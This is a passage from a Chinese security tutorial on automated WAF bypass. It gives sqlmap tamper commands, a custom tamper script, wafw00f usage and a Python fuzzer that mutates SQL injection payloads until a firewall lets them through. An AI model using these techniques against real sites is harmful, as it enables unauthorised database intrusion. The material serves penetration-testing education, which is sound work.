# 自动化WAF绕过工具

### 7.1 sqlmap --tamper

sqlmap是最流行的SQL注入自动化工具，其`--tamper`参数可以加载绕过脚本：

```bash
# 基本用法
sqlmap -u "http://target/page.php?id=1" --tamper="tamper_script.py"

# 多个tamper组合
sqlmap -u "http://target/page.php?id=1" --tamper="space2comment,between,randomcase"

# 常用tamper脚本
sqlmap -u "http://target/page.php?id=1" --tamper="space2comment.py"
# 将空格替换为/**/注释

sqlmap -u "http://target/page.php?id=1" --tamper="between.py"
# 将>替换为BETWEEN

sqlmap -u "http://target/page.php?id=1" --tamper="randomcase.py"
# 关键字随机大小写

sqlmap -u "http://target/page.php?id=1" --tamper="charunicodeencode.py"
# Unicode编码

sqlmap -u "http://target/page.php?id=1" --tamper="charencode.py"
# URL全编码
```

**常用tamper脚本汇总：**

| tamper脚本 | 功能 | 适用场景 |
|-----------|------|----------|
| space2comment | 空格→/**/ | 通用SQL注入 |
| space2plus | 空格→+ | 通用SQL注入 |
| between | >→BETWEEN | 比较操作绕过 |
| randomcase | 随机大小写 | 关键字绕过 |
| charencode | URL编码 | 编码绕过 |
| charunicodeencode | Unicode编码 | 编码绕过 |
| modsecurityversioned | MySQL内联注释 | MySQL WAF |
| halfversionedmorekeywords | 关键字加注释 | MySQL WAF |
| append0ttf | 末尾添加注释 | 通用 |
| base64encode | Base64编码 | 编码绕过 |

**自定义tamper脚本：**

```python
# custom_tamper.py - 自定义sqlmap tamper脚本
#!/usr/bin/env python
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    # 自定义绕过逻辑
    # 例如: 将UNION替换为内联注释形式
    payload = payload.replace("UNION", "/*!50000UNION*/")
    payload = payload.replace("SELECT", "/*!50000SELECT*/")
    payload = payload.replace(" ", "/**/")
    return payload
```

### 7.2 wafw00f

wafw00f是WAF识别工具，用于探测目标是否部署了WAF及WAF类型：

```bash
# 基本探测
wafw00f http://target.com

# 详细模式
wafw00f -v http://target.com

# 通过代理
wafw00f -p http://proxy:8080 http://target.com

# 输出示例:
# [+] This site is behind a Cloudflare WAF
# [+] Canary URL: http://target.com
# [+] Number of requests: 13
```

**wafw00f支持的WAF类型：**

```
wafw00f可识别的WAF:
├── Cloudflare
├── AWS WAF
├── Akamai
├── F5 ASM
├── ModSecurity
├── Imperva
├── Edgecast
├── Sucuri
├── 阿里云WAF
├── 腾讯云WAF
└── ...（100+种WAF）
```

### 7.3 bypass-firewall-by-fuzzing

bypass-firewall-by-fuzzing（BSQLi/bfpf）是通过模糊测试自动发现WAF绕过Payload的工具：

```bash
# 基本用法
python bf-fuzz.py -u "http://target/page.php?id=1" -t "attack_signature"

# 参数说明
# -u: 目标URL
# -t: 测试攻击特征（如SQL注入特征）
# -o: 输出有效绕过Payload

# 工作流程:
# 1. 发送正常请求作为基线
# 2. 发送攻击Payload确认WAF拦截
# 3. 对Payload进行变异模糊测试
# 4. 检测响应是否绕过了WAF
# 5. 输出有效的绕过Payload
```

### 7.4 其他工具

| 工具 | 功能 | 说明 |
|------|------|------|
| SQLi-helfer | SQL注入绕过Payload生成 | 针对特定WAF |
| HexMe | 自动化编码绕过 | 多种编码方式 |
| PWAF (Python WAF Fuzzer) | WAF模糊测试 | Python实现 |
| whatWAF | WAF识别+绕过建议 | 综合工具 |
| libsqli-filter-bypass | SQLi绕过库 | Payload集合 |
| XSStrike | XSS绕过自动测试 | 多种编码 |
| PwnXSS | XSS Payload生成 | 自动变形 |

### 7.5 自定义绕过Payload测试框架

```python
# WAF绕过测试框架概念示意
import requests
from urllib.parse import quote

class WAFFuzzer:
    def __init__(self, target_url, waf_indicator=None):
        self.target = target_url
        self.waf_indicator = waf_indicator or ['blocked', 'forbidden', '403']
        self.baseline_response = None
    
    def set_baseline(self, param, value):
        """设置正常请求基线"""
        r = requests.get(self.target, params={param: value})
        self.baseline_response = r
        return r
    
    def test_attack(self, param, payload):
        """测试攻击Payload是否被WAF拦截"""
        r = requests.get(self.target, params={param: payload})
        # 检测是否被拦截
        is_blocked = any(
            indicator.lower() in r.text.lower() 
            for indicator in self.waf_indicator
        )
        return not is_blocked and r.status_code == 200
    
    def try_bypass(self, param, payload, bypass_methods):
        """尝试各种绕过方法"""
        results = []
        for method_name, transform_func in bypass_methods.items():
            bypassed_payload = transform_func(payload)
            if self.test_attack(param, bypassed_payload):
                results.append({
                    'method': method_name,
                    'payload': bypassed_payload,
                    'success': True
                })
        return results

# 绕过方法定义
bypass_methods = {
    'url_encode': lambda p: quote(p),
    'double_encode': lambda p: quote(quote(p)),
    'case_variation': lambda p: ''.join(
        c.upper() if i%2 else c.lower() for i,c in enumerate(p)
    ),
    'comment_split': lambda p: p.replace(' ', '/**/'),
    'unicode_encode': lambda p: ''.join(
        f'%u{ord(c):04x}' if not c.isalnum() else c for c in p
    ),
}
```

---

---

## 📋 内容审核与补充建议

> 针对「自动化WAF绕过工具」部分的内容审核结果：

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 🛡️ 防御方案
- ⚠️ 缺少defense相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
